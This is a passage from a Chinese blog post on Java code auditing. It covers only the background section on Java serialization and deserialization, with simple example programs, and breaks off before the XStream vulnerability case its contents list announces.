<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="一、前言本文为 Java 反序列化漏洞案例调试分析学习文章，主要内容为通过已披露的信息结合 Poc 定位漏洞利用链并进行回溯分析，重思路向。 二、前置知识Java 序列化与反序列化Java 序列化 是指把 Java 对象转换为字节序列的过程，便于保存在内存、文件、数据库中，如ObjectOutputStream 类的 writeObject() 方法可以实现序列化。 Java反序列化 是指把字节序">
<meta property="og:type" content="article">
<meta property="og:title" content="Java代码审计(八)-反序列化漏洞案例调试分析">
<meta property="og:url" content="http://example.com/2024/03/18/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%85%AB)-%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="世间闲客·此闲行">
<meta property="og:description" content="一、前言本文为 Java 反序列化漏洞案例调试分析学习文章，主要内容为通过已披露的信息结合 Poc 定位漏洞利用链并进行回溯分析，重思路向。 二、前置知识Java 序列化与反序列化Java 序列化 是指把 Java 对象转换为字节序列的过程，便于保存在内存、文件、数据库中，如ObjectOutputStream 类的 writeObject() 方法可以实现序列化。 Java反序列化 是指把字节序">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230812153527991.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230812153747461.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230817152242552.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230813214904136.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230813214805534.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230813215458252.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230816144345229-16921688486111.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230816162251164.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230816152445246.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230816154712837.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230816155321191.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230816155458123.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230816155658396.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230816155805410.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230818155012194.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230818162034463.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230818161935225.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230818162426050.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230818163930547.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230818161935225.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230819150846588.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230817144037081.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230817144218001.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230817144435568.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230817145146400.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230817145324226.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230817145652475.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230817150416568.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230817150621674.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230817154237775.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230818191523527.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230818192007754.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230818195409950.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230818201645103.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230818200313210.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230818200807155.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230818202004137.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230818202344501.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230818202759615.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230818202847844.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230819121943027.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230819123639794.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230819123847457.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230819124515348.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230819124734273.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230819125255722.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230819125438579.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230819130132192.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230819130431252.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230819130613686.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230819142118262.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230819142333905.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230819143335818.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230819152832987.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230819143916112.png">
<meta property="og:image" content="http://example.com/images/Java/deserialization/image-20230819143204447.png">
<meta property="article:published_time" content="2024-03-18T12:38:09.000Z">
<meta property="article:modified_time" content="2024-03-18T09:17:20.000Z">
<meta property="article:author" content="Funsiooo">
<meta property="article:tag" content="反序列化">
<meta property="article:tag" content="JAVA">
<meta property="article:tag" content="Xstream">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/Java/deserialization/image-20230812153527991.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/logo-1.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/logo-1.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo-1.png">
        
      
    
    <!-- title -->
    <title>Java代码审计(八)-反序列化漏洞案例调试分析</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	

  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" />

<meta name="generator" content="Hexo 5.4.2"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>

<body class="max-width mx-auto px3 ">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="目录"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a href="/search/">搜索</a></li><!--
     --><!--
       --><li><a href="/tags/">标签</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇" href="/2024/03/19/APP%E6%B5%8B%E8%AF%95%E7%B3%BB%E5%88%97-APP%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B%E6%8A%93%E5%8C%85%E5%B0%8F%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇" href="/2024/03/18/%E5%B0%8F%E7%AB%99%E6%9D%82%E8%B4%A7%E5%BA%97-%E6%AD%8C%E6%9B%B2%E5%88%86%E4%BA%AB%E4%B8%80/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/03/18/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%85%AB)-%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/03/18/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%85%AB)-%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&text=Java代码审计(八)-反序列化漏洞案例调试分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/03/18/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%85%AB)-%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&title=Java代码审计(八)-反序列化漏洞案例调试分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/03/18/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%85%AB)-%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&is_video=false&description=Java代码审计(八)-反序列化漏洞案例调试分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Java代码审计(八)-反序列化漏洞案例调试分析&body=Check out this article: http://example.com/2024/03/18/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%85%AB)-%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/03/18/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%85%AB)-%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&title=Java代码审计(八)-反序列化漏洞案例调试分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/03/18/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%85%AB)-%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&title=Java代码审计(八)-反序列化漏洞案例调试分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/03/18/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%85%AB)-%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&title=Java代码审计(八)-反序列化漏洞案例调试分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/03/18/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%85%AB)-%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&title=Java代码审计(八)-反序列化漏洞案例调试分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/03/18/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%85%AB)-%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&name=Java代码审计(八)-反序列化漏洞案例调试分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/03/18/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%85%AB)-%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/&t=Java代码审计(八)-反序列化漏洞案例调试分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">一、前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">二、前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.1.</span> <span class="toc-text">Java 序列化与反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96-x2F-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%96%B9%E6%B3%95"><span class="toc-number">2.2.</span> <span class="toc-text">序列化&#x2F;反序列化方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.2.1.</span> <span class="toc-text">序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97"><span class="toc-number">2.2.2.</span> <span class="toc-text">反序列</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B"><span class="toc-number">3.</span> <span class="toc-text">三、漏洞案例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">3.1.</span> <span class="toc-text">XStream反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2020-26217"><span class="toc-number">3.1.1.</span> <span class="toc-text">CVE-2020-26217</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">四、总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%89%A9%E5%B1%95"><span class="toc-number">5.</span> <span class="toc-text">五、扩展</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E8%83%BD%E8%83%BD%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84-java-%E7%B1%BB"><span class="toc-number">5.1.</span> <span class="toc-text">常见能能执行命令的 java 类</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%8F%82%E8%80%83"><span class="toc-number">6.</span> <span class="toc-text">五、参考</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Java代码审计(八)-反序列化漏洞案例调试分析
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Funsiooo</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-03-18T12:38:09.000Z" itemprop="datePublished">2024-03-18</time>
        
        (Updated: <time datetime="2024-03-18T09:17:20.000Z" itemprop="dateModified">2024-03-18</time>)
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/JAVA/" rel="tag">JAVA</a>, <a class="tag-link-link" href="/tags/Xstream/" rel="tag">Xstream</a>, <a class="tag-link-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>本文为 Java 反序列化漏洞案例调试分析学习文章，主要内容为通过已披露的信息结合 Poc 定位漏洞利用链并进行回溯分析，重思路向。</p>
<h2 id="二、前置知识"><a href="#二、前置知识" class="headerlink" title="二、前置知识"></a>二、前置知识</h2><h3 id="Java-序列化与反序列化"><a href="#Java-序列化与反序列化" class="headerlink" title="Java 序列化与反序列化"></a>Java 序列化与反序列化</h3><p><code>Java 序列化</code> 是指把 Java <code>对象</code>转换为<code>字节序列</code>的过程，便于保存在内存、文件、数据库中，如<code>ObjectOutputStream</code> 类的 <code>writeObject()</code> 方法可以实现序列化。</p>
<p><code>Java反序列化</code> 是指把<code>字节序列</code>恢复为 Java <code>对象</code> 的过程，如<code>ObjectInputStream</code> 类的 <code>readObject()</code> 方法用于反序列化。简单案例如下：</p>
<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 定义obj对象</span></span><br><span class="line">        String obj=<span class="string">&quot;hello world!&quot;</span>;</span><br><span class="line">        <span class="comment">// 创建一个包含对象进行反序列化信息的”object”数据文件</span></span><br><span class="line">        FileOutputStream fos=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object_test&quot;</span>);</span><br><span class="line">        ObjectOutputStream os=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        <span class="comment">// writeObject()方法将obj对象写入object文件</span></span><br><span class="line">        os.writeObject(obj);</span><br><span class="line">        os.close();</span><br><span class="line">        <span class="comment">// 从文件中反序列化obj对象</span></span><br><span class="line">        FileInputStream fis=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object_test&quot;</span>);</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="comment">//恢复对象</span></span><br><span class="line">        String obj2=(String)ois.readObject();</span><br><span class="line">        System.out.print(obj2);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230812153527991.png" data-caption="image-20230812153527991"><img src="/../images/Java/deserialization/image-20230812153527991.png" alt="image-20230812153527991"></a></p>
<blockquote>
<p>序列化是让 Java 对象脱离 Java 运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储：</p>
<p>1）把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中；<br>2）在网络上传送对象的字节序列接收方接收到字符序列后，使用反序列化从字节序列中恢复出Java对象；</p>
</blockquote>
<h3 id="序列化-x2F-反序列化方法"><a href="#序列化-x2F-反序列化方法" class="headerlink" title="序列化&#x2F;反序列化方法"></a>序列化&#x2F;反序列化方法</h3><h4 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h4><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、writeObject() ： 为 ObjectOutputStream 类中的一个方法，用于将对象序列化并写入输出流的函数。它是在实现了 java.io.Serializable 接口的类中定义的。当你调用 writeObject() 方法并将一个对象作为参数传递给它时，该对象的状态将被序列化并写入输出流中。</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、writeUnshared()：该方法与 writeObject() 类似，用于将对象进行序列化并写入输出流中。不同之处在于，writeUnshared() 方法会确保对象的每次写入都是独立的，即使同一个对象多次写入，每次写入都会被视为独立的对象。这可以用于避免在序列化过程中引入对象的循环引用或共享状态。</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、XMLEncoder：XMLEncoder 类用于将 Java 对象序列化为 XML 格式的数据。它可以将 Java 对象图转换为 XML 数据。可以使用 XMLEncoder 的构造函数创建一个实例，传入一个输出流（如文件输出流、URL 输出流等），然后使用 writeObject() 方法将对象写入输出流</span><br></pre></td></tr></table></figure></div>

<h4 id="反序列"><a href="#反序列" class="headerlink" title="反序列"></a>反序列</h4><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、readObject()：为 ObjectInputStream 类中的一个方法，用于从输入流中读取序列化的对象并进行反序列化。它是在实现了 java.io.Serializable 接口的类中定义的。当你调用 readObject() 方法时，它会从输入流中读取对象的序列化数据，并将其还原为原始对象。</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、readUnshared()：该函数与 readObject() 类似，用于从输入流中读取序列化的对象进行反序列化。不同之处在于，readUnshared() 函数会确保每次读取的对象都是独立的，即使同一个对象多次读取，每次读取都会被视为独立的对象。这可以用于避免在反序列化过程中共享对象状态。</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、XMLDecoder：XMLDecoder 类用于从 XML 文件或输入流中读取 XML 数据并将其反序列化为 Java 对象。它可以将 XML 数据转换为 Java 对象图。可以使用 XMLDecoder 的构造函数创建一个实例，传入一个输入流（如文件输入流、URL 输入流等），然后使用 readObject() 方法从输入流中读取对象</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p>java.io.Serializable 接口是 Java 中的一个标记接口（marker interface），用于指示类的对象可以被序列化和反序列化。实现了 Serializable 接口的类可以通过 ObjectOutputStream 将其对象转换为字节流进行序列化，并通过 ObjectInputStream 将字节流转换回对象进行反序列化。</p>
</blockquote>
<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"># SerializationExample 类中定义了两个方法 serializeObject、deserializeObject</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="string">&quot;serializedObject.ser&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化对象</span></span><br><span class="line">        serializeObject(fileName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化对象</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">deserializedPerson</span> <span class="operator">=</span> deserializeObject(fileName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 打印反序列化后的对象信息</span></span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化对象：&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;姓名：&quot;</span> + deserializedPerson.getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;年龄：&quot;</span> + deserializedPerson.getAge());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 序列化对象，定义 serializeObject 方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializeObject</span><span class="params">(String fileName)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(fileName);</span><br><span class="line">             <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 